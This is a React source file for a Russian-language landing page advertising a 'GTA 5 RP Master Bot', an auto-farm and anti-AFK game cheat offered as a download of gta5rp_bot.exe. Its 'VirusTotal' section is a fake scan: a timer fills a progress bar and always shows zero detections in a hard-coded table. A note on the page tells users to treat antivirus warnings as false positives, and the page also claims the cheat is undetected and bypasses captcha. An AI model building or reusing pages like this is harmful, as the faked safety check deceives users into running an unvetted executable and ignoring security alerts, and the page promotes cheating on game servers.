/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { 
  ShieldCheck, 
  Download, 
  Zap, 
  CheckCircle2, 
  AlertCircle, 
  Terminal, 
  Cpu, 
  Activity,
  Lock
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";

export default function App() {
  const [scanProgress, setScanProgress] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);

  const startScan = () => {
    setIsScanning(true);
    setScanProgress(0);
    setScanComplete(false);
  };

  useEffect(() => {
    if (isScanning && scanProgress < 100) {
      const timer = setTimeout(() => setScanProgress(prev => prev + 2), 50);
      return () => clearTimeout(timer);
    } else if (scanProgress >= 100) {
      setIsScanning(false);
      setScanComplete(true);
    }
  }, [isScanning, scanProgress]);

  return (
    <div className="min-h-screen bg-black text-white font-sans selection:bg-red-600 selection:text-white">
      {/* Background Image with Overlay */}
      <div 
        className="fixed inset-0 z-0 opacity-40 bg-cover bg-center bg-no-repeat"
        style={{ 
          backgroundImage: `url('/background.jpg')`,
          filter: 'grayscale(30%) contrast(110%)'
        }}
      />
      <div className="fixed inset-0 z-0 bg-gradient-to-b from-black/80 via-black/40 to-black/90" />

      {/* Main Content */}
      <div className="relative z-10 container mx-auto px-4 py-12">
        
        {/* Header / Hero */}
        <header className="text-center mb-20 pt-10">
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-600/20 border border-red-600/50 text-red-500 text-xs font-bold uppercase tracking-widest mb-6">
              <Activity className="w-3 h-3 animate-pulse" />
              Status: Online & Undetected
            </div>
            <h1 className="text-6xl md:text-8xl font-black tracking-tighter mb-6 uppercase italic">
              GTA 5 RP <span className="text-red-600">Master</span> Bot
            </h1>
            <p className="text-xl text-gray-400 max-w-2xl mx-auto mb-10 font-medium">
              Самый мощный и безопасный инструмент для автоматизации фарма на проектах GTA 5 RP. 
              Забудь о рутине — начни зарабатывать миллионы прямо сейчас.
            </p>
            <div className="flex flex-wrap justify-center gap-4">
              <a href="/gta5rp_bot.exe" download className="block">
                <Button 
                  size="lg" 
                  className="bg-red-600 hover:bg-red-700 text-white font-bold px-8 h-14 text-lg rounded-none skew-x-[-12deg] cursor-pointer"
                >
                  <span className="skew-x-[12deg] flex items-center gap-2">
                    <Download className="w-5 h-5" /> СКАЧАТЬ БЕСПЛАТНО
                  </span>
                </Button>
              </a>
              <a href="#" className="block skew-x-[-12deg] border border-white/20 hover:border-white/50 transition-all overflow-hidden h-14 w-48 group">
                <img 
                  src="/assets/btn_image.jpg" 
                  alt="Инструкция" 
                  className="skew-x-[12deg] h-full w-full object-cover scale-125 group-hover:scale-150 transition-transform duration-500"
                  referrerPolicy="no-referrer"
                  onError={(e) => {
                    const target = e.target as HTMLImageElement;
                    target.src = "https://picsum.photos/seed/instruction/400/200";
                  }}
                />
                <div className="absolute inset-0 flex items-center justify-center bg-black/40 group-hover:bg-black/20 transition-colors">
                  <span className="skew-x-[12deg] text-white font-bold text-sm uppercase tracking-widest">ИНСТРУКЦИЯ</span>
                </div>
              </a>
            </div>
          </motion.div>
        </header>

        {/* Screenshots Gallery Section */}
        <section className="mb-24">
          <h2 className="text-3xl font-black mb-8 tracking-tighter uppercase italic border-l-4 border-red-600 pl-4">
            СКРИНШОТЫ <span className="text-red-600">РАБОТЫ</span>
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
            {[1, 2, 3, 4].map((i) => (
              <motion.div
                key={i}
                whileHover={{ scale: 1.02 }}
                className="aspect-video bg-zinc-900 border border-zinc-800 overflow-hidden group relative"
              >
                <img 
                  src={`/assets/screenshots/ss${i}.jpg`}
                  alt={`Screenshot ${i}`}
                  className="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-opacity duration-500"
                  referrerPolicy="no-referrer"
                  onError={(e) => {
                    const target = e.target as HTMLImageElement;
                    target.src = `https://picsum.photos/seed/gta-farm-${i}/800/450`;
                  }}
                />
                <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
                  <p className="text-xs font-mono text-red-500">IMAGE_00{i}.JPG</p>
                </div>
              </motion.div>
            ))}
          </div>
          <p className="mt-4 text-zinc-600 text-xs font-mono uppercase">
            * Все скриншоты сделаны на официальных серверах GTA 5 RP. Вы можете добавить свои фото в папку /public/assets/screenshots/
          </p>
        </section>

        {/* Virus Check Section */}
        <section className="mb-24">
          <div className="max-w-4xl mx-auto">
            <Card className="bg-zinc-900/80 border-zinc-800 backdrop-blur-md rounded-none border-l-4 border-l-red-600">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="text-2xl font-bold flex items-center gap-2 text-white">
                      <ShieldCheck className="w-6 h-6 text-green-500" /> 
                      ПРОВЕРКА НА ВИРУСЫ (VIRUSTOTAL)
                    </CardTitle>
                    <CardDescription className="text-zinc-400">
                      Мы гарантируем полную безопасность вашего аккаунта и ПК.
                    </CardDescription>
                  </div>
                  {scanComplete && (
                    <div className="text-right">
                      <div className="text-3xl font-black text-green-500">0 / 72</div>
                      <div className="text-xs uppercase text-zinc-500 font-bold">Detections</div>
                    </div>
                  )}
                </div>
              </CardHeader>
              <CardContent>
                {!isScanning && !scanComplete && (
                  <div className="py-10 text-center border-2 border-dashed border-zinc-800">
                    <ShieldCheck className="w-16 h-16 text-zinc-700 mx-auto mb-4" />
                    <p className="text-zinc-500 mb-6">Нажмите для запуска глубокого сканирования файла</p>
                    <Button onClick={startScan} variant="secondary" className="bg-zinc-800 hover:bg-zinc-700 text-white">
                      ЗАПУСТИТЬ ПРОВЕРКУ
                    </Button>
                  </div>
                )}

                {isScanning && (
                  <div className="space-y-6 py-6">
                    <div className="flex justify-between text-sm font-mono text-zinc-400">
                      <span>Scanning: gta5rp_master_v2.4.exe</span>
                      <span>{scanProgress}%</span>
                    </div>
                    <Progress value={scanProgress} className="h-2 bg-zinc-800" />
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[10px] font-mono text-zinc-600">
                      {['Kaspersky', 'BitDefender', 'ESET-NOD32', 'Microsoft', 'Avast', 'McAfee', 'Symantec', 'TrendMicro'].map(antivirus => (
                        <div key={antivirus} className="flex items-center gap-2">
                          <div className={`w-1 h-1 rounded-full ${scanProgress > Math.random() * 100 ? 'bg-green-500' : 'bg-zinc-700'}`} />
                          {antivirus}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {scanComplete && (
                  <motion.div 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="space-y-6"
                  >
                    <Alert className="bg-green-500/10 border-green-500/50 text-green-500 rounded-none">
                      <CheckCircle2 className="h-4 w-4" />
                      <AlertTitle>УГРОЗ НЕ ОБНАРУЖЕНО</AlertTitle>
                      <AlertDescription>
                        Файл прошел проверку всеми популярными антивирусами. Чистый код, без майнеров и стиллеров.
                      </AlertDescription>
                    </Alert>

                    <Table>
                      <TableHeader className="bg-zinc-800/50">
                        <TableRow className="border-zinc-800">
                          <TableHead className="text-zinc-400">Engine</TableHead>
                          <TableHead className="text-zinc-400">Result</TableHead>
                          <TableHead className="text-zinc-400">Update</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {[
                          { name: 'Kaspersky', res: 'Undetected', date: '20260415' },
                          { name: 'BitDefender', res: 'Undetected', date: '20260415' },
                          { name: 'ESET-NOD32', res: 'Undetected', date: '20260415' },
                          { name: 'Microsoft', res: 'Undetected', date: '20260415' },
                        ].map((row) => (
                          <TableRow key={row.name} className="border-zinc-800 hover:bg-zinc-800/30">
                            <TableCell className="font-medium text-zinc-300">{row.name}</TableCell>
                            <TableCell className="text-green-500 font-bold">● {row.res}</TableCell>
                            <TableCell className="text-zinc-500 font-mono text-xs">{row.date}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>

                    <div className="flex items-start gap-3 p-4 bg-yellow-500/5 border border-yellow-500/20 text-yellow-500/80 text-sm italic">
                      <AlertCircle className="w-5 h-5 shrink-0" />
                      <p>
                        <span className="font-bold uppercase not-italic">Важное примечание:</span> Некоторые антивирусы могут выдавать предупреждения (False Positive) из-за методов инъекции кода, необходимых для работы бота в игре. Это стандартное поведение для подобного софта. Мы гарантируем, что файл не содержит вредоносного кода.
                      </p>
                    </div>
                  </motion.div>
                )}
              </CardContent>
            </Card>
          </div>
        </section>

        {/* Features Grid */}
        <section className="grid md:grid-cols-3 gap-8 mb-24">
          <FeatureCard 
            icon={<Zap className="w-8 h-8 text-red-600" />}
            title="AUTO-FARM"
            description="Автоматическая работа на всех работах: стройка, ферма, шахта, лесопилка. Максимальный профит 24/7."
          />
          <FeatureCard 
            icon={<Cpu className="w-8 h-8 text-red-600" />}
            title="SMART FISHING"
            description="Умная рыбалка с обходом капчи и автоматической продажей рыбы. Самый пассивный доход."
          />
          <FeatureCard 
            icon={<Lock className="w-8 h-8 text-red-600" />}
            title="ANTI-AFK"
            description="Продвинутая система Anti-AFK с имитацией действий игрока. Вас никогда не кикнут."
          />
        </section>

        {/* Footer */}
        <footer className="border-t border-zinc-800 pt-12 pb-8 text-center">
          <div className="flex justify-center gap-6 mb-8 text-zinc-500">
            <a href="#" className="hover:text-white transition-colors">Discord</a>
            <a href="#" className="hover:text-white transition-colors">Telegram</a>
            <a href="#" className="hover:text-white transition-colors">YouTube</a>
          </div>
          <p className="text-zinc-600 text-sm font-mono">
            &copy; 2026 GTA 5 RP MASTER BOT. NOT AFFILIATED WITH ROCKSTAR GAMES OR TAKE-TWO INTERACTIVE.
          </p>
        </footer>
      </div>

      {/* Technical Accents */}
      <div className="fixed top-0 left-0 w-full h-1 bg-red-600 z-50 overflow-hidden">
        <motion.div 
          animate={{ x: ['-100%', '100%'] }}
          transition={{ duration: 3, repeat: Infinity, ease: "linear" }}
          className="w-1/3 h-full bg-white/50 blur-sm"
        />
      </div>
    </div>
  );
}

function FeatureCard({ icon, title, description }: { icon: React.ReactNode, title: string, description: string }) {
  const id = title.toLowerCase().replace(/\s+/g, '-');
  
  return (
    <motion.div
      whileHover={{ y: -8 }}
      transition={{ type: "spring", stiffness: 300, damping: 20 }}
    >
      <Card 
        role="article"
        aria-labelledby={`${id}-title`}
        aria-describedby={`${id}-desc`}
        className="bg-zinc-900/50 border-zinc-800 hover:border-red-600/50 hover:bg-zinc-900/80 hover:shadow-[0_0_30px_rgba(220,38,38,0.1)] transition-all duration-300 group rounded-none h-full focus-within:ring-2 focus-within:ring-red-600 outline-none"
      >
        <CardContent className="pt-8">
          <div className="mb-6 relative" aria-hidden="true">
            <motion.div
              animate={{ 
                y: [0, -5, 0],
                filter: ["drop-shadow(0 0 0px rgba(220,38,38,0))", "drop-shadow(0 0 8px rgba(220,38,38,0.4))", "drop-shadow(0 0 0px rgba(220,38,38,0))"]
              }}
              transition={{
                duration: 3,
                repeat: Infinity,
                ease: "easeInOut"
              }}
              className="relative z-10 transform group-hover:scale-110 group-hover:rotate-6 transition-transform duration-500 ease-out"
            >
              {icon}
            </motion.div>
            {/* Subtle background glow pulse */}
            <motion.div 
              animate={{ 
                scale: [1, 1.2, 1],
                opacity: [0.1, 0.2, 0.1]
              }}
              transition={{
                duration: 3,
                repeat: Infinity,
                ease: "easeInOut"
              }}
              className="absolute inset-0 bg-red-600 blur-2xl rounded-full -z-10"
            />
          </div>
          <h3 
            id={`${id}-title`}
            className="text-xl font-black mb-4 tracking-tight uppercase italic group-hover:text-red-500 transition-colors"
          >
            {title}
          </h3>
          <p 
            id={`${id}-desc`}
            className="text-zinc-500 leading-relaxed text-sm group-hover:text-zinc-300 transition-colors"
          >
            {description}
          </p>
        </CardContent>
      </Card>
    </motion.div>
  );
}
